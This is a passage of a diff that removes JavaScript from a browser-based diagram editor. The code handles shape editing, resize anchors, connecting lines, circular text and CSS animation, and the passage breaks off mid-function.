-    var b = $("t" + num);
-    var stage = 0;
-    if (b!=null) stage = b.getElementsByTagName('table')[0].rows.length;
-    if (typeof(onlinetoolbase)!='undefined')
-    onlinetoolbase.style.visibility = "hidden";
-    var haseditt = false;
-    var ta = null;
-    var wt = null, ht = null;
-    if (b!=null)
-    {
-        haseditt = true;
-        hideanchor(num);
-         
-        ta = $("e" + num);
-        wt = ta.offsetWidth;
-        ht = ta.offsetHeight;
-       // if (num == numShapes-1)
-        {
-            var v = ta.value.replace(/\r\n/g, '\n').replace(/\r/g, '\n').replace(/^[\n]+/,'');
-            var j =  v.indexOf('\n\n\n',1);
-            if (j > 0)
-            {
-                moreslice = v.substring(j+3);
-                ta.value = v.substring(0,j);
-            }
-            else
-                moreslice = '';
-        }
-       // else moreslice = '';
-
-        var stv = ta.value;
-        allShapes[num].words =  stv;
-        allShapes[num].ispic = allShapes[num].onlyimg();
-    }
-    var z = allShapes[num];
-    if (W == null )
-    {
-        if (!(z.urlas=='circular'&&z.shapename=='circle'))
-        { 
-          z.width = null;
-          z.height = null;
-        }
-    }
-    else
-    {
-        z.width = W;
-        z.height = H;
-    }
-    if (wt!=null&&(z.urlas=='circular'&&z.shapename=='circle'||stv.replace(/[ |\n]/g,'')==''))
-    {
-        z.width = wt;
-        z.height = ht;
-    }
-
-    z.initbase();
-    
-    if (b!=null && b.getElementsByTagName('table')[0].rows.length==3 && stage==2)
-    {
-        if (ta!=null && moreslice!='') ta.value = ta.value + "\n\n\n" + moreslice;
-        document.body.removeChild(z.base);
-        return;
-    }
-    if (wt != null && z.ispic == 0)
-    {
-        var pp = $('p' + z.num);
-        var lg = pp.offsetWidth;
-        if (lg + 4 > wt)
-        {
-            pp.style.width = wt + 'px'
-            //z.base.style.width = wt + 'px';
-        }
-        lg = pp.offsetWidth;
-        //if (lg  > wt)  z.base.style.width = lg + 'px';
-    }
-    z.init();
-    z.setup();
-    if (b!=null)
-        z.animates();
-    z.visible = 1;
-    z.base.style.visibility = 'visible';
-    if (allLines!=null  && b==null)
-    {
-        for (var i=0; i < numLines; i++)
-        {
-          if (allLines[i]!=null &&  allLines[i].startnum ==  num   )
-          {
-             allLines[i].sx = Math.round(allLines[i].sx*savedfontrate);
-             allLines[i].sy = Math.round(allLines[i].sy*savedfontrate);
-             allLines[i].redraw();
-          }
-          if (allLines[i]!=null &&   allLines[i].endnum ==  num )
-          {
-             allLines[i].ex = Math.round(allLines[i].ex*savedfontrate);
-             allLines[i].ey = Math.round(allLines[i].ey*savedfontrate);
-             allLines[i].redraw();
-          }
-        }
-    }
-    if (ismakingtab == 1 && typeof(LaTexHTML)!='undefined')
-    {
-        LaTexHTML.formatele(allShapes[num].base);
-    }
-
-    if (b!=null)
-    {
-       document.body.removeChild(b);
-       numediting = -1;
-    }
-
-    hassaved = false;
-    document.onmousemove = onmouseover0;
-    allShapes[num].inediting = false;
-    sendObject(num);
-    if (b!=null)
-    {
-    if (numsselected1==null)
-        numsselected1 = [num];
-    else
-        numsselected1[numsselected1.length] = num;
-    }
-    if (moreslice != '')
-    {
-        num = allShapes.length;
-        if ( (W!=null || H!=null) && enforce == true)
-        {
-            var qz = new Shape( num,moreslice,'', z.shapename,z.x+z.base.offsetWidth,z.y, W, H, z.fontsize, z.color, z.bcolor, z.fc, z.time,z.zindex,z.start,z.fontfamily,z.slope);
-        }
-        else
-        {
-            qz = new Shape( num,moreslice, '', z.shapename,z.x+z.base.offsetWidth,z.y, null, null, z.fontsize, z.color, z.bcolor,z.fc,z.time,z.zindex,z.start,z.fontfamily,z.slope);
-        }
-        qz.visible = 1;
-        allShapes[num] = qz;
-        edit(num);
-        done(num, W, H, enforce);
-
-    }
-    else
-    {
-        if (b!=null)
-        {
-            numsselected = new Array(numsselected1.length);
-            for (var j=0; j < numsselected.length; j++)
-                numsselected[j] = numsselected1[j];
-            numsselected1 = null;
-            mdia(num,1);
-            var xx = $('m' + num + '_1');
-            xx.style.left = (z.x + z.width*0.7) + 'px';
-            xx.style.top = (z.y + 10) + 'px';
-        }
-        if (haseditt && demohandle==null)
-        saveit();
-    }
-}
-
-
-
-function modifyimg(tag, num, w, h)
-{
-    var pi = allShapes[num].words.indexOf("<" + tag +" ");
-     allShapes[num].words = allShapes[num].words.substring(0,pi) +
-     ( (allShapes[num].words.substring(pi).indexOf(" width=")>0)? allShapes[num].words.substring(pi).replace(/ width=[0-9]+/, " width=" + w).replace(/height=[0-9]+/, "height=" + h)
-     : ("<" + tag +"  width=" + w +" height=" + h + " "+allShapes[num].words.substring(pi+2 + tag.length)));
-    done(num);
-}
-var anchorx,anchory;
-function showanchor(obj, baseobj, direct )
-{
-    var num = parseInt(obj.id.substring(1));
-
-    if ( (''+num)== 'NaN')
-    {
-        if (otherunique == null)
-            otherunique = obj;
-        else
-            return;
-    }
-    else
-    {
-        if (obj.id.charAt(0)== 'z')
-        {
-          if (entered[num] != null && obj.id.charAt(0) != 'z')
-          {
-              hideanchor(num);
-              entered[num] = obj;
-          }
-          else if (entered[num] == null)
-          {
-               entered[num] = obj;
-          }
-          else
-               return;
-        }
-        else
-        {
-            if (entered[num] != null)
-               return;
-            else
-               entered[num] = obj;
-        }
-    }
-    if ($("a" + num)!=null) return;
-    var anchor = document.createElement("div");
-    anchor.id = "a" + num;
-    var xy = findPositionnoScrolling(baseobj);
-    var z = 0;
-    if ( isNaN(baseobj.style.zIndex)== false)
-        z = parseInt(baseobj.style.zIndex);
-    z += 2 ;
-
-    if (direct== 'ss')
-    {
-         anchor.style.cssText = "position:absolute;left:" + (xy[0] + baseobj.offsetWidth/2-10) + "px;top:" + (xy[1]+baseobj.offsetHeight-2)
-        + "px;width:20px;height:2px;z-index:" + z + ";cursor:" + direct + "-resize;background-color:black";
-        anchor.innerHTML = fillblank;
-    }
-    else if (obj.id == 'b' + num )
-    {
-        var ww = baseobj.offsetWidth;
-        var hh = baseobj.offsetHeight ;
-
-        var qq = 0;
-        var zz = 0;
-        try{
-           qq = (allShapes[num].base.offsetWidth - allShapes[num].width)/2;
-           zz = parseInt(allShapes[num].extract(allShapes[num].base.style.cssText,"padding").replace(/([0-9]+).*/,'$1'));
-           if (''+zz == 'NaN') zz = 0;
-
-        }catch(e){}
-
-        ww = allShapes[num].width + qq;
-        hh = allShapes[num].height + zz;
-
-        anchor.style.cssText = "position:absolute;left:" + (xy[0] + ww-11) + "px;top:" + (xy[1]+hh-12)
-        + "px;width:12px;height:12px;z-index:" + z + ";cursor:" + direct + "-resize;border-bottom-style:solid;border-bottom-width:2px;border-bottom-color:"
-        + colors[allShapes[num].color] + ";border-right-width:2px;border-right-style:solid;border-right-color:" +
-        colors[allShapes[num].color];
-
-        anchor.innerHTML = "<!---->";
-    }
-    else if (obj.id == 'z' + num)
-    {
-        var ww = baseobj.offsetWidth;
-        var hh = baseobj.offsetHeight ;
-        anchor.style.cssText = "position:absolute;left:" + (xy[0] + ww-11) + "px;top:" + (xy[1]+hh-12)
-        + "px;width:12px;height:12px;z-index:" + z + ";cursor:" + direct + "-resize;border-bottom-width:2px;border-bottom-color:"
-        + allShapes[num].color + ";border-right-width:2px;border-right-color:" + allShapes[num].color;
-        anchor.innerHTML = "&drcorn;";
-    }
-    else if (obj.id == 'e' + num)
-    {
-        var ww = obj.offsetWidth;
-        var hh = obj.offsetHeight ;
-        anchor.style.cssText = "position:absolute;left:" + (xy[0] + ww-11) + "px;top:" + (xy[1]+hh-12)
-        + "px;width:12px;height:12px;z-index:" + z + ";cursor:" + direct + "-resize;border-bottom-width:2px;border-bottom-color:"
-        + "black" + ";border-bottom-style:solid;border-right-width:2px;border-right-color:black;border-right-style:solid";
-        anchor.innerHTML = "<!---->";
-    }
-    else if (obj.id == 'c' + num)
-    {
-        var ww = obj.offsetWidth;
-        var hh = obj.offsetHeight ;
-        anchor.style.cssText = "position:absolute;left:" + (xy[0] + ww-11) + "px;top:" + (xy[1]+hh-12)
-        + "px;width:12px;height:12px;z-index:" + z + ";cursor:" + direct + "-resize;border-bottom-width:2px;border-bottom-color:"
-        + "black" + ";border-bottom-style:solid;border-right-width:2px;border-right-color:black;border-right-style:solid";
-        anchor.innerHTML = "<!---->";
-    }
-    document.body.appendChild(anchor);
-    var bxy = findPositionnoScrolling(baseobj);
-
-    Drag.init(anchor);
-    anchor.onDragStart = function(x,y)
-    {
-       var num = parseInt(this.id.substring(1));
-
-       if ( (''+num) != 'NaN')
-         var obj = entered[num];
-       else
-           obj = otherunique;
-       if (obj == null) return;
-       anchorx = x;
-       anchory = y;
-    }
-    anchor.onDragEnd = function(x,y)
-    {
-       var num = parseInt(this.id.substring(1));
-       if ( (''+num) != 'NaN')
-         var obj = entered[num];
-       else
-           obj = otherunique;
-       if (obj == null) return;
-       var xy =  findPositionnoScrolling(obj);
-       var w = x - xy[0] - (baseobj.offsetWidth - obj.offsetWidth);
-       var h = y - xy[1] - (baseobj.offsetWidth - obj.offsetWidth);
-
-       if (w < 2 || h < 2) return;
-
-       if (typeof(obj.tagName) == 'undefined')   return;
-       if (obj.tagName.toLowerCase()== 'div' && obj.id.charAt(0) == 'c')
-       {
-           var ps = allCurves[num].points;
-           var minx = 10000,maxx =-10000, miny=10000,maxy=-10000;
-          for (var i=0; i < ps.length; i++)
-       {    if (ps[i][0] < minx)
-               minx = ps[i][0];
-           else if (ps[i][0] > maxx)
-               maxx = ps[i][0];
-           if (ps[i][1] < miny)
-               miny = ps[i][1];
-           else if (ps[i][1] > maxy)
-               maxy = ps[i][1];
-       }
-           
-           var rx = ((maxx - minx)  +  x-anchorx)/(maxx - minx);
-           var ry = ((maxy -miny) +  y-anchory)/(maxy -miny);
-            for (var i=0; i < ps.length; i++)
-            {
-                ps[i][0] = minx + rx*(ps[i][0]-minx);
-                ps[i][1] = miny + rx*(ps[i][1]-miny);
-            }
-           allCurves[num].redraw();
-       }
-       else if (obj.tagName.toLowerCase()== 'div' && obj.id.charAt(0) == 'b')
-       {
-            done(num, w, h, true);
-       }
-
-       else if (obj.tagName.toLowerCase()== 'textarea')
-       {
-           w = (obj.offsetWidth + (x-anchorx));
-           h = obj.offsetHeight + (y-anchory);
-           obj.style.width = w + 'px';
-           obj.style.height = h + 'px';
-           favorw = w;
-           favorh = h;
-       }
-       else
-           modifyimg(obj.tagName.toLowerCase(), num, w, h);
-       hideanchor(num);
-
-    }
-    setTimeout("hideanchor(" + num +")", 5000);
-}
-function hideanchor(num)
-{
-
-    var obj = $("a" + num);
-    if (obj == null) return;
-    document.body.removeChild(obj);
-    entered[num] = null;
-
-}
-function begindraw(bv)
-{
-    var num = parseInt(bv.id.substring(1));
-    bv = $('b'+num);
-    var sp = allShapes[num];
-    var tsn = sp.shapename;
-    if (linetype== '' || state== 0) return;
-    var xy = sp.dotposition();
-    var i = myHintx - sp.x - xy[0];
-    var j = myHinty - sp.y - xy[1];
-    var dn = j;
-    var ds = Math.abs(j - sp.height);
-    var de = Math.abs(i - sp.width);
-    var dw = i;
-    var md = dn;
-    if (md > ds) md = ds;
-    if (md > de) md = de;
-    if (md > dw) md = dw;
-    if (sp.ispic >0 )
-    {
-        if (md== dn)
-        {
-            j = 0;
-            i = 0.5;
-        }
-        else if (md== dw)
-        {
-            i = 0;
-            j = 0.5;
-        }
-        else if (md== de)
-        {
-            i = 1;
-            j = 0.5;
-        }
-        else if (md== ds)
-        {
-            i = 0.5;
-            j = 1;
-        }
-    }
-    else
-    {
-        j /= sp.height;
-     
-        if (Math.abs(j) < 0.03) { j = 0; i =0.5;}
-        else if (Math.abs(1-j) < 0.03){j=1; i=0.5;}
-        else if (de > i)
-            i = 0;
-        else
-            i = 1;
-    }
-
-
-    if (state == 1)
-    {
-        savestart = num;
-        savestartx = i;
-        savestarty = j;
-        state = 2;
-        var adot = document.createElement("div");
-        adot.id = "q" + num;
-        adot.style.cssText = "position:absolute;width:6px;height:6px;left:" +  (xy[0] + sp.width*i)
-        +"px;top:" + (sp.height*j + xy[1]) +"px;border:1px #909090 solid;background-color:yellow;z-index";
-        adot.innerHTML = fillblank;
-        allShapes[num].base.appendChild(adot);
-        sp.toshape();
-        sp.onshape = true;
-    }
-    else if (state== 2)
-    {
-        sp.toshape();
-        sp.onshape = true;
-        var k = cachedlinethick;
-        var l = new Line(drawlinenumber,linetype,savestart,savestartx,savestarty, num, i, j, k,seldirect,0,3,cachedlinecolor,0);
-        if (numsselected==null)
-        {
-            numsselected = [l.num]
-        }
-        else
-            numsselected[numsselected.length] = l.num;
-        drawlinenumber = null;
-        var x = $("q" + savestart);
-        if(savestart>=0)
-           allShapes[savestart].base.removeChild(x);
-        else
-           document.body.removeChild(x);
-        state = 1;
-    }
-    document.onmousemove = onmouseover0;
-}
-
-function getFontsize()
-{
-    var sel = $("fntsize");
-    if (sel == null) return 20;
-    var sfs = parseInt(sel.options[sel.selectedIndex].value);
-    return sfs;
-}
-function circular(x, radius, cl)
-{
-   var ans = "";
-   x = x.replace(/&nbsp;/g,' ').toLowerCase();
-   var U = 19; if (U > 350/x.length) U = 350/x.length;
-   if (x.length < 7)
-   {
-       U = 35;
-       x = "---" + x + "---";
-       x = x.replace(/ /,'');
-   }
-   for (var j=0; j < x.length; j++)
-   {
-       var u = U;
-       var y = x.charAt(j);
-
-       if (y == '-') y = '<font size=' + ((j<2||x.length-1-j<2)?2:1) + '>&bull;</font>';
-       ans += "<div style=\"padding:0px 0px 0px 0px;margin:" + (j==0?0:(-radius)) + "px 0px 0px 0px;width:" + radius + "px;height:" + radius + "px;border-radius:" + (radius/2) + "px;transform:rotate(" + (0.4+j-x.length/2)*U + "deg);font-size:inherit;font-weight:700;text-align:center\">" + y + "</div>";
-   }
-   ans +=  '<div style="padding:0px 0px 0px 0px;margin:-' 
-           + radius + 'px 0px 0px 0px;width:' 
-           + radius + 'px;line-height:' 
-           + radius + 'px;border-radius:' 
-           + (radius/3) + 'px;font-size:25px;font-weight:700;text-align:center;vertical-align:middle">&star;</div>';
-   return ans;
-}
- 
-function Shape (num, words, urlas, shapename,x, y, w, h, fs, cl, bc, fc,tm,zIndex,starttime, fontfamily,slope)
-{
-    
-   this.onlyimg = function()
-   {
-       if (this.words == null) return 0;
-       var str = this.words.replace(/[ ]+$/,'');
-       if (str.length>0 && this.urlas=='circular' && this.shapename=='circle')
-           return 3;
-       var b = str.length>4 ;
-       var b1 = false, b2=false, b3=false;
-       if (b)
-       {
-            b1 = str.charAt(0)=='[';
-            if (b1)
-            {
-                b2 = str.charAt(str.length-1)==']';
-                if (b2)
-                {
-                    b3 = str.substring(1,str.length-1).replace(/[0-9]+$/g,'')==  textmsg[1303]
-                     || str.substring(1,str.length-1).replace(/[0-9]+$/g,'')==  "Imagelet" ;
-                }
-            }
-       }
-       if (b3) return 1;
-       if (this.words.replace(/http[s]?:\/\/[^ ]+$/i,'')=='' && this.urlas.length>0 && this.urlas.charAt(0) == '1')
-           return 2;
-       return 0;
-   }
-    this.parse = function(str)
-   {
-        var parser = new CSVParse(str,"'",",",";");
-        var words = parser.nextElement();
-        if (words == null) this.words ='';
-        else this.words = words;
-        this.urlas = parser.nextElement();
-        this.shapename = parser.nextElement();
-        this.x = parseInt(parser.nextElement()); if (this.x<0) this.x = 0;
-        this.y = parseInt(parser.nextElement()); if (this.y < 0) this.y = 0;
-        var w = null;
-        var h = null;
-        var w1 = parser.nextElement();if (w1!= '' && w1!=null) w = parseInt(w1);
-        var h1 = parser.nextElement();if (h1!= '' && h1!=null) h = parseInt(h1);
-        this.width = w;
-        this.height = h;
-        this.fontsize = parseInt(parser.nextElement());
-        var cl = parser.nextElement();
-        var cn = 0;
-         if (cl==null) cl = 'black';
-         if (isNaN(cl))
-            cn = rcolor(cl);
-         else
-            cn = parseInt(cl);
-        this.color = cn;
-        var bc = parser.nextElement();
-        var bn = 0;
-         if (bc==null) bc = 'black';
-         if (isNaN(bc))
-            bn = rbcolor(bc);
-         else
-            bn = parseInt(bc);
-        this.bcolor = bn;
-
-        this.fc = parseInt(parser.nextElement());
-        this.time = parseFloat(parser.nextElement());
-        this.zindex = parseInt(parser.nextElement());
-        this.start = parseFloat(parser.nextElement());
-        var ffs = parser.nextElement();
-        var fns = textmsg[1594].split(/@/);
-        for(var  i =0; i < fns.length; i++)
-        {
-             if (samefont(ffs,fns[i])) break;
-        }
-        if (i == fns.length) ffs = cachedfontfamily;
-        this.fontfamily = ffs;
-        this.inediting =  (parser.nextElement() == ("true"));
-        var slope =  parser.nextElement();
-        if ( slope == null) this.slope = 0;
-        else this.slope = parseInt(slope);
-        this.ispic =  this.onlyimg();
-         if (ismakingtab!=1 && false)
-       {
-       
-           if (this.ispic>0)
-             this.words = '<img src="image/pic.png" width=50>';
-          else if (this.words!=null)
-             this.words = this.words.replace(/<img [^>]+>/g, '<img src="image/pic.png" width=50>');
-       }
-   }
-
-   if (ismakingtab!=1)
-   {
-       if (x!=null)
-           x = Math.round(ismakingtab*x);
-       if (y!=null)
-           y = Math.round(ismakingtab*y);
-       if (w!=null)
-           w = Math.round(ismakingtab*w);
-       if (h!=null)
-           h = Math.round(ismakingtab*h);
-       if (fs!=null)
-           fs = Math.round(ismakingtab*fs);
-   }
-    
-  var s = ("words=" + words + '\nsp='+ shapename+ '\nx=' + x+ '\ny=' + y+ '\nw=' + w+ '\nh=' + h+ '\nfs=' + fs+ '\ncl=' + cl+ '\nbc=' + bc+ '\nfc=' + fc+ '\nzi=' + zIndex+ '\nor=' + starttime) ;
-   if (zIndex == null)
-      this.zindex =  1;
-   else
-      this.zindex = zIndex;
-   this.slope = 0;
-   if (slope!=null && isNaN(''+slope) == false)
-      this.slope =  slope;
-   if (tm == null )
-       this.time = 5;
-   else
-       this.time = tm;
-   this.urlas = urlas;
-   this.fontfamily = cachedfontfamily;
-   if (fontfamily != null)
-       this.fontfamily = fontfamily;
- 
-   if (shapename == null )
-       shapename = 'rightrect';
-   var sfs = getFontsize();
-   this.x = x;
-   this.y = y;
-   if (fs == null) fs = sfs;
-   if (cl == null) cl = 0;
-   if (bc == null) bc = 0;
-    
-   
-
-   this.shapename = shapename;
-   this.width = null;
-   this.height = null;
-   if (isNaN(''+w) == false)
-   {
-      this.width = w;
-      this.height = h;
-   }
-   this.words = words;
-   this.num = num;
-   if (starttime == null)
-      this.start = 5*this.num;
-   else
-      this.start = starttime;
-   this.fontsize = fs;
-   this.color = cl;
-   if (bc == null) bc = bcolors.length-2;
-   this.bcolor = bc;
-   this.fc = 0;
-   this.inediting = false;
-   if(fc!=null)
-   {
-       this.fc = fc;
-   }
-   this.visible = 0;
-   this.bx = 0;
-   this.by = 0;
-   this.validdrag = false;
-   this.ispic =  this.onlyimg();
-   if (ismakingtab!=1)
-   {
-      if (this.ispic>0)
-         this.words = '<img src="image/pic.png" width=50>';
-      else if (this.words!=null)
-         this.words = this.words.replace(/<img [^>]+>/g, '<img src="image/pic.png" width=50>');
-   }
-   this.base = null;
-   this.onshape = true;
-   
-    this.leaves = function()
-    {
-        var kframe = kframes[pagenum + '_' + this.num];
-        if (kframe!=null)
-        {
-            if (kframe.ltm > 0 && (kframe.lts!=null && kframe.lts.length>0 || kframe.lsn!=-1))
-            {
-                this.base.style.animation = "bl" +   "_" + this.num + " " + kframe.ltm + "s 1";
-            }
-            else 
-            {
-                this.base.style.visibility = 'hidden';
-                this.visible = 0;
-            }
-        }
-        else 
-        {
-                this.base.style.visibility = 'hidden';
-                this.visible = 0;
-        }
-        for (var j=0; j < allLines; j++)
-       {
-           if (allLines[j]==null) continue;
-           if ((allLines[j].startnum==-1 || allShapes[allLines[j].startnum].visible) &&  allLines[j].endnum == this.num 
-             ||(allLines[j].endnum==-1 || allShapes[allLines[j].endnum].visible) && allLines[j].startnum == this.num)
-           allLines[j].delme();   
-       }
-    }
-    this.animates = function()
-   {
-        var kframe = kframes[pagenum + '_' + this.num];
-        if (kframe!=null)
-        {
-            if (kframe.etm > 0 && (kframe.ets!=null && kframe.ets.length>0 || kframe.esn!=-1))
-            {
-                this.base.style.animation = "be" +   "_" + this.num + " " + kframe.etm + "s 1";
-                if (kframe.stm > 0 && (kframe.sts!=null && kframe.sts.length>0 || kframe.ssn!=-1))
-                {
-                    setTimeout("allShapes[" + this.num + "].animate('bs" +  "_" + this.num + "'," + kframe.stm + "," + kframe.loop + ");", kframe.etm*1000);
-                }
-            }
-            else if (kframe.stm > 0 && (kframe.sts!=null && kframe.sts.length>0 || kframe.ssn!=-1))
-            {
-                this.animate("bs" +   "_" + this.num,kframe.stm,kframe.loop);
-            }
-            else 
-            {
-                this.base.style.animation = null;
-                this.visible =  1;
-                this.base.style.opacity = '1.0';
-            }
-        }
-        else 
-        {
-            this.base.style.animation = null;
-            this.base.style.opacity = '1.0';
-            this.visible = 1;
-        }
-        this.base.style.visibility = this.visible == 1?'visible':'hidden';
-   }
-   this.animate = function(nm,tm,loop)
-   {
-       this.base.style.animationName = nm;
-       this.base.style.animationDuration = tm + "s";
-       this.base.style.animationIterationCount =  loop==-1?'infinite':(''+loop);
-       for (var j=0; j < allLines; j++)
-       {
-           if (allLines[j]==null) continue;
-           if ((allLines[j].startnum==-1 || allShapes[allLines[j].startnum].visible) &&  allLines[j].endnum == this.num 
-             ||(allLines[j].endnum==-1 || allShapes[allLines[j].endnum].visible) && allLines[j].startnum == this.num)
-           allLines[j].draw();   
-       }
-   }
-   this.keyframe = function(stage)
-   {
-       var wt = this.width;
-       var ht = this.height;
-       var xy = this.dotposition();
-       wt += xy[0] * 2 + this.framew()*2;
-       ht += xy[1] * 2+ this.framew()*2;
-       var str  = stage + "%{left:" + this.x + "px;top:" + this.y + "px;width:" + wt + "px;height:"
-                + ht + "px;font-size:" + this.fontsize + "px;color:" + colors[this.color];
-       if (this.isrect()){
-           str+= ";background-color:";
-        if (this.bcolor < 10)
-            str += bcolors[this.bcolor] + ";";
-        else
-            str += "transparent;";
-      }
-        if ((this.fc & 2) > 0)
-            str += "box-shadow:#777 3px 3px;";
-        else
-            str += "box-shadow:#777 0px 0px;";
-        if ((this.fc & 1) == 0)
-            str += "border-radius:" + this.framew() + "px " + colors[this.color] + " solid;";
-        else
-            str += "border-radius:0px " + colors[this.color] + " solid;";
-        if ((this.fc & 4) > 0)
-            str += "text-shadow:#777 1px 1px;";
-        else
-            str += "text-shadow:#777 0px 0px;";
-        if (this.bcolor < 10)
-        {
-            if ((this.fc & 8) > 0)
-                str += "background-image:" + gradient(bcolors[this.bcolor],this.shapename) + ";";
-            else
-                str += "background-image:url();";
-        }
-        str += "transform:rotate(" + this.slope + "deg);";
-        return str;
-   }
-   
-   this.basiccss = function()
-   {
-       return "text-align:center;vertical-align:middle;box-sizing:border-box;position:absolute;top:" + this.y +"px;left:" + this.x +"px;font-family:" + this.fontfamily  + ";font-size:" + this.fontsize + 'px;text-shadow:' + ((this.fc & 4)/4) + "px " + ((this.fc & 4)/4) + "px grey;color:" + colors[this.color] + ";visibility:" + (this.visible==1?'visible;':'hidden;');
-   }
-   this.initbase = function()
-   {
-       var bb = 'b';
-       if (inkframe) bb = 'u';
-       var x = $(bb+ this.num)
-       if (x!=null)
-       {
-           if (typeof(LaTexHTML) != 'undefined')
-               LaTexHTML.deformat(this.base);
-           document.body.removeChild(x);
-       }
-       this.ispic = this.onlyimg();
-
-       this.base = document.createElement("div");
-       this.base.id = bb + this.num;
-       var tmp = this.basiccss();
-       if (inkframe)
-           tmp = tmp.replace(/absolute/,'static').replace(/hidden/,'visible');
-       this.base.style.cssText = tmp;
-       bb ='p';
-       if (inkframe) bb = 'v';
-        if (this.ispic==3)
-            this.base.innerHTML = "<div id=\"" +bb+ this.num + "\" style=\"font-size:inherit;margin:0px;vertical-align:middle;display:inline-block;\">" + circular(this.words, this.width , colors[this.color]) + "</div>";
-       else if (this.ispic>0)
-            this.base.innerHTML = tohtml(this.words, this.urlas, colors[this.color],this.shapename);
-       else
-            this.base.innerHTML = "<div id=\"" + bb + this.num + "\" style=\"font-size:inherit;margin:0px;vertical-align:middle;display:inline-block;text-align:left;line-height:" + 1.2*this.fontsize + "px;margin:auto\">" + tohtml(this.words, this.urlas, colors[this.color],this.shapename)+ "</div>";
-
-       document.body.appendChild(this.base);
-
-       //if (typeof(LaTexHTML) != 'undefined')   LaTexHTML.formatele(this.base);
-       if (this.width == null)
-       {
-           this.width = this.base.offsetWidth + 3;
-           this.height = this.base.offsetHeight + 3;
-       }
-       else
-       {
-           this.base.style.width = this.width + 'px';
-           this.base.style.height = this.height + 'px';
-       }
-   }
-   this.resize = function()
-   {
-       var x = $('g' + this.num);
-       if (x!=null) this.base.removeChild(x);
-       x = $('h' + this.num);
-       if (x!=null) this.base.removeChild(x);
-       x = $('f' + this.num);
-       if (x!=null) this.base.removeChild(x);
-       this.base.style.width = null;
-       this.base.style.height = null;
-       this.base.style.margin = '0px';
-       this.base.style.padding = '0px';
-       this.base.style.borderRadius = '0px';
-       this.base.style.borderWidth = '0px';
-       this.base.style.overflow ='visible';
-       this.base.style.fontSize = (this.fontsize) + 'px';
-       this.base.style.transform = "rotate(0deg)" ;
-       //this.base.style.border = "1px red solid";
-   }
-
-   this.noshape = function()
-   {
-       this.base.style.transform = "rotate(0deg)";
-       this.base.left = this.x + "px";
-       this.base.top = this.y + "px";
-       this.onshape = false;
-   }
-   
-   this.toshape = function()
-   {
-       this.onshape = true;
-       this.base.style.transform = "rotate(" + this.slope + "deg)";
-   }
-   this.move = function(Ax, Ay,z)
-   {
-        var mx = parseInt(this.base.style.left.replace(/px/i,''));
-        var my = parseInt(this.base.style.top.replace(/px/i,''));
-        var  x = Ax - mx;
-        var  y = Ay - my;
-        var more = true;
-        if (z!=null)
-        {
-            more = false;
-
-        }
-        else if (Math.abs( x) + Math.abs( y) < 4)
-        {
-            more = false;
-        }
-        else if (x>0 && y==0){x=2;y=0;}
-        else if (x>y && y>0){x=2;y=1;}
-        else if (x==y && y>0){x=1;y=1;}
-        else if (y > x && x>0){x=1;y=2;}
-        else if (y > 0 && x==0){x=0;y=2;}
-        else if (y > -x && y>0){x=-1;y=2;}
-        else if (-x==y && y>0){x=-1;y=1;}
-        else if (y < -x && y>0){x=-2;y=1;}
-        else if (y == 0 && x < 0){x=-2;y=0;}
-
-        else if (-x>-y && y<0){x=-2;y=-1;}
-        else if (x==y && y < 0){x=-1;y=-1;}
-        else if (-y > -x && x<0){x=-1;y=-2;}
-        else if (y < 0 && x==0){x=0;y=-2;}
-        else if (-y > x && y < 0){x=1;y=-2;}
-        else if (-x==y && y<0){x=1;y=-1;}
-        else if (-y < x && y<0){x=2;y=-1;}
-
-        mx += x;
-        my += y;
-        this.x = mx;
-        this.y = my;
-        this.base.style.top = my + 'px';
-        this.base.style.left = mx + 'px';
-        var fw = this.framew();
-
-        {
-            this.base.style.left = (parseInt(this.base.style.left.replace(/px/i,'')) + x) + 'px';
-            this.base.style.top =  (parseInt(this.base.style.top.replace(/px/i,'')) + y)  + 'px';
-
-        }
-        if (more && this.num < allShapes.length)
-            setTimeout("allShapes[" + this.num + "].move(" + Ax + "," + Ay + ")",5);
-        else  redrseline();
-   };
-
-   this.framew = function()
-   {
-       return 1+ Math.round(this.fontsize/30);
-   }
-   this.isrect = function()
-   {
-       return this.shapename == 'rightrect'
-           || this.shapename == 'roundrect'
-           || this.shapename == 'circle'
-           || this.shapename == 'ellipse'
-           || this.shapename == 'egg' ;
-   }
-
-   this.shapewidth = function()
-   {
-       var wdd = 1;
-        if (this.ispic>0)
-            return 1;
-        if (this.shapename=='diamond')
-        {
-            wdd =  1.92;
-        }
-        else if (this.shapename.indexOf('rect')==5)
-        {
-            wdd = 1;
-        }
-        else if (  this.shapename == 'circle' )
-        {
-            wdd = 1.414;
-        }
-        else if ( this.shapename == 'hexgon' )
-        {
-            wdd = 1.3;
-        }
-        else if (this.shapename == 'ellipse'  )
-        {
-            wdd = 1.35;
-        }
-        else if (this.shapename == 'clouds' || this.shapename == 'egg')
-        {
-            wdd = 1.5;
-        }
-        return wdd;
-   }
-   this.dotposition = function()
-   {
-       var wt = this.width;
-       var ht = this.height;
-       var fw = this.framew();
-        if (this.ispic > 0)
-            return [0,0];
-        else if (this.shapename== 'rightrect' || this.shapename== 'roundrect')
-        {
-            return [0, 0];
-        }
-        else if (this.shapename== 'circle')
-        {
-            var sd = Math.sqrt(wt*wt+ ht*ht);
-            var mx = sd ;
-            var tp = (mx - ht)/2;
-            var wd = (mx -wt)/2;
-
-            return [ wd, tp];
-        }
-        else  if (this.shapename== 'ellipse')
-        {
-            return [ 0.2*wt,  0.2*ht];
-        }
-        else if (this.shapename== 'egg')
-        {
-            return [ 0.25*wt,  0.25*ht];
-        }
-        else if (this.shapename== 'diamond')
-        {
-           return [ 0.5*wt, 0.5*ht];
-        }
-        else  if (this.shapename== 'hexgon')
-        {
-           var mt = (1.3)*((wt>ht)?wt:ht);
-           return [ ((mt-wt)/2), ((mt-ht)/2)];
-
-        }
-        else if (this.shapename== 'clouds')
-        {
-           return [ (0.25*wt),   (0.25*ht)];
-        }
-        return [0,0];
-   }
-   this.basecss = function()
-   {
-       var jj = this.onlyimg();
-       this.ispic = jj;
-       var fw  = this.framew();
-       var framecolor =  colors[this.color];
-       if ((this.fc & 1) == 1)
-       {
-           framecolor = bcolors[this.bcolor];
-           fw = 0;
-       }
-       var wt = this.width;
-       var ht = this.height;
-       var boxshadow = ((this.fc & 2) > 0)?2:0;
-       var twocolors = null;
-       if (this.bcolor < 9)
-       {
-           if ( (this.fc & 8 ) > 0 && (jj==0 || jj==3))
-           {
-               var bf = "background-image:" + gradient(bcolors[this.bcolor],this.shapename) + ";";
-               twocolors = bf.replace(/[^#]+(#[0-9]+)[^#]+(#[0-9]+).*/, "$1,$2").split(/,/);
-           }
-           else
-               bf = 'background-color:' + bcolors[this.bcolor] + ";";
